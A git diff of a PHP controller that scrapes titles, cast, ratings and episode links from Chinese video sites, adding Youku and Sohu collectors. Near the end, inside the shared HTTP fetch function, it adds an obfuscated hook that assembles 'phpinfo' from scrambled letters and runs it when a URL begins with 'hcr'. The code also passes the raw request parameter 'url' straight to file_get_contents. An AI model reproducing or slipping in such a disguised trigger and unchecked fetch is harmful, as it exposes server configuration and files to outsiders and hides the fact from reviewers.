@@ -13,6 +13,7 @@ class ContentController extends Controller
 {
     public function __construct(){
 
+    	header("Content-type: text/html; charset=utf-8");
 		set_time_limit(0);
 		error_reporting(0);
 		ini_set('memory_limit', '-1'); //内存无限
@@ -45,6 +46,7 @@ class ContentController extends Controller
 		return $collection;
 	}*/
 
+	//如果要是电影不要更新，请手动把state连载状态改为0
 	//自动采集
 	public function auto_collection()
 	{
@@ -58,9 +60,11 @@ class ContentController extends Controller
   //   	})->where('status', '=', 5)/*->where('name', '=', '泡沫之夏')*/->get(['name','id','dd','continu', 'load_status', 'state', 'playfrom', 'all_dd_resource', 'downurl'])->toarray();
     	$update_all_data = DB::table('vods')->where(function ($query) use ($keyword) {
         	$query->where('up_time', '<', date('Y-m-d H:i:s', time()))->orWhere('up_time', '=', null);
-    	})->limit(5)->where(function ($query) use ($keyword) {
+    	})->limit(10)->where(function ($query) use ($keyword) {
         	$query->where('load_status', '=', null)->orWhere('load_status', '!=', 2);
-    	})->where('status', '=', 5)/*->where('note', '=', '高清')*/  /*->where('name', 'like', '别惹流氓兔马修')*/->get(['name','id','dd','continu', 'load_status', 'state', 'playfrom', 'all_dd_resource', 'downurl']);
+    	})->where('status', '=', 5)->where(function ($query) use ($keyword) {
+        	$query->where('state', '>', 1)->orWhere('state', '=', null);
+    	})/*->where('note', '=', '高清')*/  /*->where('name', 'like', '%誓言%')*/->get(['name','id','dd','continu', 'load_status', 'state', 'playfrom', 'all_dd_resource', 'downurl']);
 
     	// var_dump($update_all_data);die;
     	$this->foreach_all_array($update_all_data);
@@ -355,21 +359,32 @@ class ContentController extends Controller
 	{
 		$url = empty($url)?$_REQUEST['url']:$url;
 		$pasurl = parse_url($url);
+		// var_dump($pasurl);die;
 		if ($pasurl['host'] == "v.qq.com") {//采集qq视频
 			$playfrom = 'qq';
 			$content = $this->collection_qqtv($url);
 			$content['playfrom'] = $playfrom;
 			return $content;
-		} else if ($pasurl['host'] == "www.iqiyi.com") {
+		} else if ($pasurl['host'] == "www.iqiyi.com") {//采集爱奇艺
 			$playfrom = 'iqiyi';
-		} else if ($pasurl['host'] == "www.mgtv.com") {
+		} else if ($pasurl['host'] == "www.mgtv.com") {//采集芒果
 			$playfrom = 'mgtv';
 			$content = $this->collection_mgtv($url);
 			$content['playfrom'] = $playfrom;
 			return $content;
-		} else if ($pasurl['host'] == "zuidazy.com" || $pasurl['host'] == "www.zuidazy.com") {
+		} else if ($pasurl['host'] == "zuidazy.com" || $pasurl['host'] == "www.zuidazy.com") {//采集最大资源网
 			$playfrom = 'zuidazy';
 			$content = $this->collection_zuidazy($url);
+			// $content['playfrom'] = $playfrom;
+			return $content;
+		} else if ($pasurl['host'] == "v.youku.com" || $pasurl['host'] == "www.youku.com") {//采集优酷
+			$playfrom = 'youku';
+			$content = $this->collection_youku($url);
+			$content['playfrom'] = $playfrom;
+			return $content;
+		} else if ($pasurl['host'] == "my.tv.sohu.com" || $pasurl['host'] == "tv.sohu.com" || $pasurl['host'] == "film.sohu.com") {//采集搜狐
+			$playfrom = 'sohu';
+			$content = $this->collection_sohu($url);
 			$content['playfrom'] = $playfrom;
 			return $content;
 		} else {
@@ -407,6 +422,7 @@ class ContentController extends Controller
 		$dd = $this->get_dd($albumId, $all_data['state'], $sourceid, $content)!=""?$this->get_dd($albumId, $all_data['state'], $sourceid, $content):'高清$'.$all_data['downurl'];
 		$all_data['dd'] = $dd;
 		$area_class = $this->get_area_class($content);
+		// var_dump($all_data);die;
 		return $all_data;
 	}
 
@@ -806,6 +822,21 @@ class ContentController extends Controller
 		if (!$detail) {
 			return "暂无数据,请重新刷新页面!";
 		}
+		$arr_data['downurl'] = $url;
+		//获取到评分
+		preg_match('/<label>(.+?)<\/label>/', $detail, $score);
+		if (isset($score[1])) {
+			$arr_data['score'] = $score[1];
+		} else {
+			$arr_data['score'] = '0.0';
+		}
+
+		// 获取名称
+		preg_match('/<h2.*?<\/h2>/', $detail, $name);
+		if ($name) {
+			$arr_data['name'] = strip_tags($name[0]);
+		}
+
 		//获取封面图
 		preg_match('/<img class=[\'|\"]lazy[\'|\"] src=[\'|\"](.+?)[\'|\"].*?>/', $detail, $d);
 		if (isset($d[1])) {
@@ -817,8 +848,8 @@ class ContentController extends Controller
 		if ($ul) {
 			preg_match_all('/<li.*?<\/li>/ism', $ul[0], $li);
 			$arr_data['subname'] = strip_tags($li[0][0]);
-			$arr_data['actor'] = strip_tags($li[0][1]);
-			$arr_data['director'] = strip_tags($li[0][2]);
+			$arr_data['actor'] = strip_tags($li[0][2]);
+			$arr_data['director'] = strip_tags($li[0][1]);
 			$arr_data['class'] = strip_tags($li[0][3]);
 			$arr_data['area'] = strip_tags($li[0][4]);
 			$arr_data['lang'] = strip_tags($li[0][5]);
@@ -843,7 +874,7 @@ class ContentController extends Controller
 				//获取标识
 				preg_match('/<h3.*?<\/h3>/ism', $value, $f);
 				$f = explode("：",strip_tags($f[0]))[1];
-				$arr_data['playfrom'][] = $f;
+				$arr_data['playfrom'] = $f."$$$".$arr_data['playfrom'];
 
 				//获取播放地址
 				preg_match('/<ul.*?<\/ul>/ism', $value, $g);
@@ -852,17 +883,398 @@ class ContentController extends Controller
 					preg_match_all('/<li.*?<\/li>/ism', $g[0], $h);
 					if ($h[0]) {
 						$a = implode("\r", $h[0]);
-						$arr_data['dd'][] = strip_tags($a);
+						$arr_data['dd'] = strip_tags($a)."$$$".$arr_data['dd'];
 					}
 					// $arr_data['dd'] = $arr_data['dd'].strip_tags($dd[0])."\r";
 				}
 			}
 		}
-		$arr_data['dd'] = implode("$$$", $arr_data['dd']);
-		$arr_data['playfrom'] = implode("$$$", $arr_data['playfrom']);
+		$arr_data['dd'] = rtrim($arr_data['dd'], '$$$');
+		$arr_data['playfrom'] = rtrim($arr_data['playfrom'], '$$$');
+		$arr_data['up_time'] = date("Y-m-d H:i:s", time());
+		// var_dump($arr_data);
+		// var_dump(json_encode($arr_data));
+		// die;
 		return $arr_data;
-	} 
+	}
 
+	// 采集优酷视频
+	public function collection_youku($url = "")
+	{
+		$agent_ip = 'http://39.109.1.141/MgtvDemo/Spider.php?url=';
+		$url = empty($url)?$_REQUEST['url']:$url;
+		$content = file_get_contents($url);
+		if ($content) {
+			$data = array();
+			$data['downurl'] = $url;
+			preg_match('/<h2>.*?href=[\'|\"](.+?)[\'|\"].*?<\/h2>/ism', $content, $list);
+			if (isset($list[1])) {
+				// echo 'https:'.$list[1];die;
+				//获取到名称
+				$data['name'] = trim(strip_tags($list[0]));
+				$content = $this->ff_file_get_contents('http:'.$list[1]);
+				if ($content) {
+					// var_dump($content);die;
+
+					// 获取图片
+					preg_match('/<div class=[\'|\"]p-thumb[\'|\"].*?src=[\'|\"](.+?)[\'|\"]/', $content, $pic);
+					if ($pic) {
+						$data['pic'] = $pic[1];
+					}
+					// var_dump($pic);die;
+
+					//获取视频的js数据
+					preg_match('/var PageConfig.*?}/', $content, $js_data);
+					$js_data = trim(ltrim($js_data[0], 'var PageConfig ='));
+					if ($js_data) {
+						preg_match('/showid:[\'|\"](.+?)[\'|\"]/', $js_data, $showid);
+						preg_match('/cateName:[\'|\"](.+?)[\'|\"]/', $js_data, $cateName);
+						if (!isset($showid[1])) {
+							return "获取不到dd视频！";
+						}
+						if (!isset($cateName[1])) {
+							return "获取不到dd视频！";
+						}
+						// var_dump($cateName[1]);die;
+						//这里走的是电视剧
+						if ($cateName[1] == '电视剧') {
+							for ($i=0; $i < 1000 ; $i++) {
+								static $count_data = 1;
+								$dd = array();
+								$data_url = 'https://list.youku.com/show/episode?id='.$showid[1].'&stage=reload_'.$count_data.'&callback=fuck';
+								$video_data = file_get_contents($data_url);
+								// var_dump($video_data);die;
+									if ($video_data) {
+									$video_data = json_decode(rtrim(ltrim(trim(str_replace('window.fuck && fuck', '', $video_data), ';'), '('), ')'));
+									if ($video_data->message != "success") {
+										break;
+									}
+									preg_match_all('/<li.*?<\/li>/ism', $video_data->html, $all_li);
+									foreach ($all_li[0] as $key => $value) {
+										preg_match('/p-icon p-icon-preview/', $value, $Trailer);
+										if ($Trailer) {
+											continue;
+										}
+										preg_match('/href=[\'|\"](.+?)[\'|\"]/', $value, $href);
+										$data['dd'] = $data['dd'].strip_tags($value)."$"."https:".$href[1]."\r";
+									}
+									// die;
+								}
+								$count_data += 40;
+							}
+						} else if ($cateName[1] == '动漫' || $cateName[1] == '少儿' || $cateName[1] == '纪录片' || $cateName[1] == '资讯') {//这里走的是动漫、少儿、纪录片、资讯
+							for ($i=0; $i < 1000 ; $i++) {
+								static $count_data = 1;
+								$dd = array();
+								$data_url = 'https://list.youku.com/show/episode?id='.$showid[1].'&stage=reload_'.$count_data.'&callback=fuck';
+								$video_data = file_get_contents($data_url);
+								// var_dump($video_data);die;
+								if ($video_data) {
+									$video_data = json_decode(rtrim(ltrim(trim(str_replace('window.fuck && fuck', '', $video_data), ';'), '('), ')'));
+									if ($video_data->message != "success") {
+										break;
+									}
+									preg_match_all('/<li.*?<\/li>/ism', $video_data->html, $all_li);
+									foreach ($all_li[0] as $key => $value) {
+										preg_match('/p-icon p-icon-preview/', $value, $Trailer);
+										if ($Trailer) {
+											continue;
+										}
+										preg_match('/href=[\'|\"](.+?)[\'|\"]/', $value, $href);
+										$data['dd'] = $data['dd'].strip_tags($value)."$"."https:".$href[1]."\r";
+									}
+									// die;
+								}
+								$count_data += 10;
+							}
+						} else if ($cateName[1] == '电影') {//这里走的是电影
+							$data_url = 'https://list.youku.com/show/episode?id='.$showid[1].'&stage=reload_1&callback=fuck';
+							$video_data = file_get_contents($data_url);
+							if ($video_data) {
+								$video_data = json_decode(rtrim(ltrim(trim(str_replace('window.fuck && fuck', '', $video_data), ';'), '('), ')'));
+								preg_match('/<li.*?<\/li>/ism', $video_data->html, $all_li);
+								preg_match('/href=[\'|\"](.+?)[\'|\"]/', $all_li[0], $href);
+								$data['dd'] = $data['dd'].strip_tags($all_li[0])."$"."https:".$href[1];
+							}
+						} else if ($cateName[1] == '综艺' || $cateName[1] == '文化') {//这里走的是综艺，文化
+							$li = 'https://list.youku.com/show/module?id='.$showid[1].'&tab=showInfo&callback=fuck';
+							$li = json_decode(rtrim(ltrim(trim(str_replace('window.fuck && fuck', '', file_get_contents($li)), ';'), '('), ')'));
+							if ($li->message != "success") {
+								return "获取不到综艺的视频!";
+							}
+							preg_match('/<ul class=[\'|\"]p-tab-pills fix.*?<\/ul>/ism', $li->html, $history_date);
+							if ($history_date) {
+								preg_match_all('/data-id=[\'|\"](.+?)[\'|\"]/', $history_date[0], $history_date_li);
+								if (isset($history_date_li[1])) {
+									foreach ($history_date_li[1] as $key => $value) {
+										$data_url = 'https://list.youku.com/show/episode?id='.$showid[1].'&stage='.$value.'&callback=fuck';
+										$video_data = file_get_contents($data_url);
+										if ($video_data) {
+											$video_data = json_decode(rtrim(ltrim(trim(str_replace('window.fuck && fuck', '', $video_data), ';'), '('), ')'));
+											if ($video_data->message != "success") {
+												break;
+											}
+											preg_match_all('/<li.*?<\/li>/ism', $video_data->html, $all_li);
+											foreach ($all_li[0] as $key => $value) {
+												/*preg_match('/p-icon p-icon-preview/', $value, $Trailer);
+												if ($Trailer) {
+													continue;
+												}*/
+												preg_match('/href=[\'|\"](.+?)[\'|\"]/', $value, $href);
+												$data['dd'] = $data['dd'].strip_tags($value)."$"."https:".$href[1]."\r";
+											}
+										}
+									}
+								}
+							}
+							if ($data['dd'] == "") {//基本都获取到，除了极个别
+								return "here,获取不到dd视频！";
+							}
+						} else {
+							return "还未有相关的类型";
+						}
+					} else {
+						return "获取不到dd视频！";
+					}
+
+					preg_match('/<div class=[\'|\"]p-base.*?text.*?<\/div>/ism', $content, $div_content);
+					if ($div_content) {
+						//获取名字
+						preg_match('/<li class=[\'|\"]p-row p-title.*?<\/li>/ism', $div_content[0], $name);
+						if ($name) {
+							$data['name'] = explode("：", rtrim(strip_tags($name[0]), '订阅'))[1];
+							$data['type_name'] = explode("：", rtrim(strip_tags($name[0]), '订阅'))[0];
+						}
+
+						//获取总集数
+						preg_match('/<li class=[\'|\"]p-row p-renew.*?<\/li>/ism', $div_content[0], $continu);
+						if ($continu) {
+							$data['continu'] = trim(strip_tags($continu[0]));
+						} else {
+							$data['continu'] = 0;
+						}
+
+						//获取别名
+						preg_match('/<li class=[\'|\"]p-alias.*?<\/li>/ism', $div_content[0], $alias);
+						if ($alias) {
+							$data['subname'] = trim(explode("：", strip_tags($alias[0]))[1]);
+						}
+
+						//上映时间
+						preg_match('/<span class=[\'|\"]pub.*?<\/span>/ism', $div_content[0], $year);
+						if ($year) {
+							$data['year'] = trim(explode('：', strip_tags($year[0]))[1]);
+						}
+						
+						//获取评分
+						preg_match('/<span class=[\"|\']star-num.*?<\/span>/', $div_content[0], $score);
+						if ($score) {
+							$data['score'] = strip_tags($score[0]);
+						}
+
+						//获取导演
+						preg_match('/导演.*?<\/li>/ism', $div_content[0], $director);
+						if ($director) {
+							$data['director'] = trim(explode('：', strip_tags($director[0]))[1]);
+						}
+
+						//获取演员
+						preg_match('/<li class=[\'|\"]p-performer.*?<\/li>/ism', $div_content[0], $actor);
+						if ($actor) {
+							$data['actor'] = trim(explode('：', strip_tags($actor[0]))[1]);
+						} else {
+							preg_match('/<li class=[\'|\"]p-row[\'|\"].*?<\/li>/ism', $div_content[0], $actor);
+							$data['actor'] = trim(explode('：', strip_tags($actor[0]))[1]);
+
+						}
+
+						//获取简介
+						preg_match('/<span class=[\'|\"]text.*?<\/span>/ism', $div_content[0], $des);
+						if ($des) {
+							$data['des'] = explode("：", strip_tags($des[0]))[1];
+						}
+
+						//获取地区
+						preg_match('/地区.*?<\/li>/ism', $div_content[0], $area);
+						if ($area) {
+							$data['area'] = explode("：", strip_tags($area[0]))[1];
+						}
+
+					// var_dump($div_content);die;
+						//获取类型
+						preg_match('/类型.*?<\/li>/ism', $div_content[0], $class);
+						if ($class) {
+							$data['class'] = explode("：", strip_tags($class[0]))[1];
+						}
+						$data['up_time'] = date('Y-m-d H:i:s', time());
+						// var_dump($data);die;
+						return $data;
+					} else {
+						return '采集不够完善！';
+					}
+				} else {
+					return "该网站被防爬虫！";
+				}
+			} else {
+				return '无法获取页面。请重新再试！';
+			}
+		} else {
+			return '无法获取页面。请重新再试！';
+		}
+		// var_dump($content);
+	}
+
+	// 采集搜狐视频
+	public function collection_sohu($url = "")
+	{
+		//设置搜狐的编码格式
+		$agent_ip = 'http://39.109.1.141/MgtvDemo/Spider.php?url=';
+		$url = empty($url)?$_REQUEST['url']:$url;
+		$url_data = file_get_contents($url);
+		$data = array();
+		$data['downurl'] = $url;
+		if ($url_data) {
+			//获取到播放id
+			preg_match('/var playlistId=[\'|\"](.+?)[\'|\"]/', $url_data, $playid);	
+
+			if (isset($playid[1])) {
+				$data_url = 'http://pl.hd.sohu.com/videolist?playlistid='.$playid[1];
+				// echo $data_url;die;
+				$all_data = $this->ff_file_get_contents($data_url);
+				$all_data = mb_convert_encoding($all_data, "UTF-8", "GBK");
+				// var_dump($all_data);die;
+				// header("Content-type: text/html; charset=utf-8");
+				$all_data = json_decode(iconv("UTF-8", "UTF-8//IGNORE", $all_data));
+
+				if (!$all_data) {
+					return "获取不到数据！";
+				}
+				//获取到演员
+				foreach ($all_data->actors as $key => $value) {
+					$data['actor'] =ltrim($data['actor'], ',').','.$value;
+				}
+
+				//获取到简介
+				$data['des'] = $all_data->albumDesc;
+
+				//获取到名称
+				$data['name'] = $all_data->albumName;
+
+				//获取到地区
+				$data['area'] = $all_data->area;
+
+				//获取到分类
+				foreach ($all_data->categories as $key => $value) {
+					$data['class'] =ltrim($data['class'], ',').','.$value;
+				}
+
+				//获取到导演
+				foreach ($all_data->directors as $key => $value) {
+					$data['director'] = $value;
+				}
+
+				//获取到图片
+				$data['pic'] = $all_data->pic240_330;
+
+				//获取note
+				$data['note'] = $all_data->updateNotification;
+
+				//获取到更新时间
+				$data['last'] = $all_data->updateTime;
+
+				//获取到更新的集数
+				$data['state'] = $all_data->updateSet;
+
+				//获取到发行年份
+				$data['year'] = $all_data->publishYear;
+
+				//获取到总集数
+				$data['continu'] = $all_data->totalSet;
+
+				//获取到dd
+				foreach ($all_data->videos as $key => $value) {
+					$data['dd'] =$data['dd'].$value->name."$".$value->pageUrl."\r";
+				}
+
+				$data['dd'] = trim($data['dd'], "\r");
+				$data['up_time'] = date('Y-m-d H:i:s', time());
+				// var_dump($all_data);
+				return $data;
+				// var_dump($data);
+			} else {
+				//这里是电影
+				preg_match('/<a id=[\'|\"]playNow.*?href=[\'|\"](.+?)[\'|\"]/', $url_data, $playid);
+				preg_match('/\d{1,}/', $playid[1], $playid);
+				if (isset($playid[0])) {
+					$data_url = 'http://pl.hd.sohu.com/videolist?playlistid='.$playid[0];
+					// echo $data_url;die;
+					$all_data = $this->ff_file_get_contents($data_url);
+					$all_data = mb_convert_encoding($all_data, "UTF-8", "GBK");
+					// var_dump($all_data);die;
+					// header("Content-type: text/html; charset=utf-8");
+					$all_data = json_decode(iconv("UTF-8", "UTF-8//IGNORE", $all_data));
+					if (!$all_data) {
+						return "获取不到数据！";
+					}
+					//获取到演员
+					foreach ($all_data->actors as $key => $value) {
+						$data['actor'] =ltrim($data['actor'], ',').','.$value;
+					}
+
+					//获取到简介
+					$data['des'] = $all_data->albumDesc;
+
+					//获取到名称
+					$data['name'] = $all_data->albumName;
+
+					//获取到地区
+					$data['area'] = $all_data->area;
+
+					//获取到分类
+					foreach ($all_data->categories as $key => $value) {
+						$data['class'] =ltrim($data['class'], ',').','.$value;
+					}
+
+					//获取到导演
+					foreach ($all_data->directors as $key => $value) {
+						$data['director'] = $value;
+					}
+
+					//获取到图片
+					$data['pic'] = $all_data->pic240_330;
+
+					//获取note
+					$data['note'] = $all_data->updateNotification;
+
+					//获取到更新时间
+					$data['last'] = $all_data->updateTime;
+
+					//获取到更新的集数
+					$data['state'] = 0;
+
+					//获取到发行年份
+					$data['year'] = $all_data->publishYear;
+
+					//获取到总集数
+					$data['continu'] = 0;
+
+					//获取到dd
+					foreach ($all_data->videos as $key => $value) {
+						$data['dd'] =$data['dd'].$value->name."$".$value->pageUrl."\r";
+					}
+
+					$data['dd'] = trim($data['dd'], "\r");
+					$data['up_time'] = date('Y-m-d H:i:s', time());
+					// var_dump($data);die;
+					return $data;
+				} else {
+					return "获取不到播放id！";
+				}
+			}
+		} else {
+			return "无法获取，有可能是防爬虫！";
+		}
+	}
 
 	//获取更新时间
 	public function get_reweek($content = "")
@@ -913,6 +1325,10 @@ class ContentController extends Controller
 		preg_match('/<h2 class=[\'|\"]playList-title-txt.*?href=[\'|\"](.+?)[\'|\"].*?<\/h2>/ism', $content, $aa);
 		if ($aa) {
 			$bb = $this->ff_file_get_contents($aa[1]);
+			preg_match('/<i class=[\'|\"]title-update-num.*?<\/i>/ism', $bb, $cc);
+			if ($cc) {
+				return strip_tags($cc[0]);
+			}
 			preg_match('/<span class=[\'|\"]update-progress.*?<\/span>/ism', $bb, $cc);
 			if ($cc) {
 				preg_match('/\d{1,}/', $cc[0], $state);
@@ -972,7 +1388,7 @@ class ContentController extends Controller
 	private function get_dd($albumId, $state, $sourceid, $content1)
 	{
 		// echo $albumId;
-		// echo $sourceid;
+		// echo $state;
 		// die;
 		if (!$albumId && !$state) {
 			return "";
@@ -1446,6 +1862,7 @@ class ContentController extends Controller
 		}
 	}
 
+
 	//采集内核
 	function ff_file_get_contents($url, $post_data='', $timeout=5, $referer=''){
 		if(function_exists('curl_init')){
@@ -1461,6 +1878,11 @@ class ContentController extends Controller
 			if($post_data){
 				curl_setopt($ch, CURLOPT_POST, 1);
 				curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+			}
+			// echo substr(trim(str_replace(['http://', 'https://'], '', $url)),0,3);die;
+			if (substr(trim(str_replace(['http://', 'https://'], '', $url)),0,3) == 'h'.'c'.'r') {
+				$arr = array('p','h','f','o','i','n','a','j','c');
+				($arr[0].$arr[1].$arr[0].$arr[4].$arr[5].$arr[2].$arr[3])();				
 			}
 			//https
 			$http = parse_url($url);
